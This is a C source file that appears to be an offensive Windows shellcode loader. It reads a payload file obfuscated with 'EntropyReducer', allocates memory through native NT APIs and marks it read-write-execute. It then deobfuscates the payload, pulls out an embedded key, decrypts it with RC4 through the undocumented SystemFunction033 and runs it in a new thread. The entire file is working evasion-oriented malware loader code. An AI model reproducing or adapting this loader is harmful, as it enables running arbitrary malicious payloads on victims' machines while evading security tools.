#include <Windows.h>
#include <stdio.h>
#include "EntropyReducer.h"

// Function to report WinApi Errors
BOOL ReportError(const char* WinApiName) {
    printf("[!] \"%s\" [ FAILED ] \t%d \n", WinApiName, GetLastError());
    return FALSE;
}

// Function to Decrypt the RC4 encrypted Payload
BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    NTSTATUS STATUS = 0;

    // Defining the key as a USTRING structure
    USTRING Key = {
        .Buffer = pRc4Key,
        .Length = (USHORT)dwRc4KeySize,
        .MaximumLength = (USHORT)dwRc4KeySize
    };

    // Defining the Encrypted Data as a USTRING Structure
    USTRING Data = {
        .Buffer = pPayloadData,
        .Length = (USHORT)sPayloadSize,
        .MaximumLength = (USHORT)sPayloadSize
    };

    // Exporting SystemFunction033 from the Advapi32.dll
    HMODULE hAdvapi32 = LoadLibraryA("Advapi32");
    if (!hAdvapi32) {
        return ReportError("LoadLibraryA");
    }
    fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(hAdvapi32, "SystemFunction033");
    if (!SystemFunction033) {
        return ReportError("GetProcAddress");
    }

    // Calling the SystemFunction033
    if ((STATUS = SystemFunction033(&Data, &Key)) != 0x0) {
        printf("[!] SystemFunction033 FAILED With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char* argv[]) {

    if (!(argc >= 2)) {
        printf("[!] Please Specify A Input File To Read ... \n");
        return -1;
    }
    DWORD dwOldProtection = 0x00;
    PVOID pExecAddress = NULL;
    HANDLE hThread = NULL;
    PVOID pAddress = NULL;

    SIZE_T RawPayloadSize = 0;
    PBYTE RawPayloadBuffer = NULL;

    // Read the Payload
    printf("[i] Reading \"%s\" ... ", argv[1]);
    if (!ReadPayloadFile(argv[1], &RawPayloadBuffer, &RawPayloadSize)) {
        return -1;
    }
    printf("[+] DONE \n");
    printf("\t>>> Raw Payload Size : %zu \n\t>>> Read Payload Located At : 0x%p \n", RawPayloadSize, RawPayloadBuffer);

    SIZE_T sPayload = RawPayloadSize,
        sObfSize = RawPayloadSize;

    unsigned char _key[0x10] = { 0 };

    // Load NTAllocateVirtualMemory
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return ReportError("GetModuleHandleA");
    }
    pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    if (!NtAllocateVirtualMemory) {
        return ReportError("GetProcAddress");
    }

    // Allocate Memory
    NTSTATUS status = NtAllocateVirtualMemory((HANDLE)-1, &pExecAddress, 0, &sPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("[!] NtAllocateVirtualMemory FAILED With Error: 0x%0.8X \n", status);
        return -1;
    }
    printf("[+] Allocated : %p\n", pExecAddress);

    // Load and use NtProtectVirtualMemory
    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    if (!NtProtectVirtualMemory) {
        return ReportError("GetProcAddress");
    }
    ULONG ulOldProtection;
    status = NtProtectVirtualMemory((HANDLE)-1, &pExecAddress, &sPayload, PAGE_EXECUTE_READWRITE, &ulOldProtection);
    if (status != 0) {
        printf("[!] NtProtectVirtualMemory FAILED With Error: 0x%0.8X \n", status);
        return -1;
    }

    // Load and use NtWriteVirtualMemory
    NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    if (!NtWriteVirtualMemory) {
        return ReportError("GetProcAddress");
    }
    status = NtWriteVirtualMemory((HANDLE)-1, pExecAddress, RawPayloadBuffer, sPayload, NULL);
    if (status != 0) {
        printf("[!] NtWriteVirtualMemory FAILED With Error: 0x%0.8X \n", status);
        return -1;
    }

    printf("[+] Payload Written to : %p\n", pExecAddress);

    // Deobfuscate the Payload
    SIZE_T DeobfuscatedPayloadSize = 0;
    PBYTE DeobfuscatedPayloadBuffer = NULL;

    printf("[i] Deobfuscating");
    if (!Deobfuscate((PBYTE)pExecAddress, sObfSize, (PBYTE*)&pExecAddress, &DeobfuscatedPayloadSize)) {
        return -1;
    }

    printf("[+] DONE \n");
    printf("\t>>> Deobfuscated Payload Size : %zu \n\t>>> Deobfuscated Payload Located At : 0x%p \n", DeobfuscatedPayloadSize, pExecAddress);

    // Extracting the Key from the payload and updating the pointer to be after the key
    memcpy(_key, pExecAddress, 0x10); // copy the first 16 bytes to _key
    pExecAddress = (PVOID)((ULONG_PTR)pExecAddress + 0x10); // update pointer to be after the first 16
    printf("[+] Pointer Updated\n");

    printf("[i] Decrypting with %p\n", pExecAddress);
    printf("[i] Retrieved Key: [ ");
    for (size_t i = 0; i < sizeof(_key); i++)
        printf("%02X ", _key[i]);
    printf("]\n");

    DWORD dwResourceDataSize = (DWORD)(DeobfuscatedPayloadSize - 0x10);

    // Decrypt the payload
    Rc4EncryptionViSystemFunc033(_key, (PBYTE)pExecAddress, sizeof(_key), dwResourceDataSize);

    printf("[+] Payload Decrypted at : %p\n", pExecAddress);
    printf("[$] Press <Enter> To Run ... ");
    getchar();

    // Load and use NtProtectVirtualMemory to set the memory to PAGE_EXECUTE_READWRITE
    status = NtProtectVirtualMemory((HANDLE)-1, &pExecAddress, &sPayload, PAGE_EXECUTE_READWRITE, &ulOldProtection);
    if (status != 0) {
        printf("[!] NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE) FAILED With Error: 0x%0.8X \n", status);
        return -1;
    }

    // Create Thread to run the Payload
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecAddress, NULL, 0, NULL);
    if (!hThread) {
        return ReportError("CreateThread");
    }

    // Run the Payload
    WaitForSingleObject(hThread, INFINITE);

    printf("[+] DONE \n");

    return 0;
}
